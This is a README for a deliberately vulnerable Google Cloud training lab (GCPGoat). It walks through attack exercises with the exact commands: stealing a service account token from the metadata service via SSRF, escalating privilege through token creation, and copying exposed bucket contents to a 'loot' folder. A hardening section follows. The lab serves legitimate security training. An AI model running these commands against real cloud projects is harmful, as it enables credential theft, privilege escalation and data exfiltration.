# INE GCPGoat: Google Cloud Platform (GCP) Red Teaming & IAM Escalation

## Overview

INE GCPGoat is a deliberately vulnerable Google Cloud Platform infrastructure project developed by INE Labs. It models real-world enterprise cloud misconfigurations, IAM privilege escalation pathways, and serverless architecture flaws to train cloud security engineers and penetration testers in GCP attack surfaces.

Alongside Rhino Security CloudGoat (AWS) and INE AzureGoat (Azure), GCPGoat completes the multi-cloud red teaming curriculum in `cyber_lab`. It provides a containerized Google Cloud SDK workspace configured with `gcloud`, Terraform, Python 3, and cloud auditing toolchains.

- **Workspace Access**: `docker compose exec -it gcpgoat /bin/bash` or `./gcpgoat.sh`
- **Container Name**: `cyberlab_realworld_gcpgoat`
- **Docker Shortcut**: `./lab start gcpgoat && ./lab shell gcpgoat`
- **RAM Footprint**: ~350 MB

---

## Architecture & GCP Threat Vectors

```
+-------------------------------------------------------------+
|                GCP Project IAM & Resource Scope             |
|                                                             |
|  [Compromised Web App / Compute Instance]                   |
|    - Server-Side Request Forgery (SSRF)                     |
|                                                             |
|  [Instance Metadata Service (IMDS v1)]                      |
|    - http://metadata.google.internal/computeMetadata/v1/    |
|    - Requires Header: "Metadata-Flavor: Google"             |
|    - Returns: Service Account OAuth2 Access Token           |
|                                                             |
|  [IAM Role Escalation Pathways]                             |
|    - roles/iam.serviceAccountUser                           |
|    - roles/iam.serviceAccountTokenCreator                   |
|    - roles/deploymentmanager.editor                         |
|                                                             |
|  [Google Cloud Storage (GCS) Buckets]                       |
|    - Overly permissive "allUsers" / "allAuthenticatedUsers" |
|    - Sensitive credential backups, Terraform state files    |
+-------------------------------------------------------------+
```

---

## Quick Start & Workspace Usage

```bash
cd Real_World_Industry_Labs/08_gcp_cloud_security/gcpgoat

# Launch the GCP CLI Workspace
./gcpgoat.sh

# Inside the workspace container:
# 1. Authenticate to your GCP project (browser or device code)
gcloud auth login --no-launch-browser

# 2. Set your active target project
gcloud config set project <PROJECT_ID>

# 3. Verify active credentials
gcloud auth list
```

---

## Key GCP Vulnerability Scenarios & Attack Exercises

### 1. Exploiting GCP Instance Metadata Service (IMDS) via SSRF

- **Vulnerability Mechanism**: Unlike AWS IMDSv1 which required no custom headers, GCP IMDS requires the HTTP header `Metadata-Flavor: Google` to mitigate basic SSRF. However, when an application forwards user-supplied HTTP headers or uses open proxy libraries, attackers bypass this defense.
- **Attack Walkthrough**:
  Query the compute engine metadata service to steal the default service account's OAuth2 token:
  ```bash
  curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  ```
  The server responds with an OAuth 2.0 access token:
  ```json
  {
    "access_token": "ya29.c.b0...",
    "expires_in": 3599,
    "token_type": "Bearer"
  }
  ```

### 2. IAM Privilege Escalation: Service Account Token Creator

- **Scenario**: The compromised service account possesses the `roles/iam.serviceAccountTokenCreator` permission on a high-privilege service account (such as `editor-sa@project.iam.gserviceaccount.com`).
- **Exploitation**:
  Generate an administrative bearer token:
  ```bash
  gcloud iam service-accounts generate-access-token \
    editor-sa@<PROJECT_ID>.iam.gserviceaccount.com \
    --scopes=https://www.googleapis.com/auth/cloud-platform
  ```

### 3. Google Cloud Storage (GCS) Bucket Auditing & Exfiltration

- **Scenario**: Publicly readable buckets or misconfigured IAM ACLs:
  ```bash
  # Check for open bucket permissions
  gsutil ls gs://<BUCKET_NAME>

  # Copy sensitive configuration backups or terraform state
  gsutil cp -r gs://<BUCKET_NAME> ./loot/
  ```

---

## Defensive Remediation & Hardening

1. **Enforce Workload Identity Federation**:
   Eliminate long-lived service account keys (`.json`) by binding Kubernetes service accounts directly to IAM roles.
2. **Restrict IMDS Access**:
   Enable Workload Identity and disable legacy Compute Engine metadata endpoints.
3. **Least Privilege IAM Roles**:
   Avoid assigning primitive roles (`Owner`, `Editor`) and remove `roles/iam.serviceAccountTokenCreator` unless strictly required.
4. **Prevent Public Bucket Access**:
   Enforce **Public Access Prevention (PAP)** across all GCS buckets in the organization policy.

---

## Video Walkthroughs & Technical References

- [GCPGoat INE - Solution Path 1](https://www.youtube.com/watch?v=cM46_c-zxh4)
- [Understanding common Google Cloud misconfiguration using GCP Goat](https://www.youtube.com/watch?v=dcKER88tH50)
- [INE Labs GCPGoat GitHub Repository](https://github.com/ine-labs/GCPGoat)
- [Google Cloud IAM Security Best Practices](https://cloud.google.com/iam/docs/best-practices-for-using-and-managing-service-accounts)
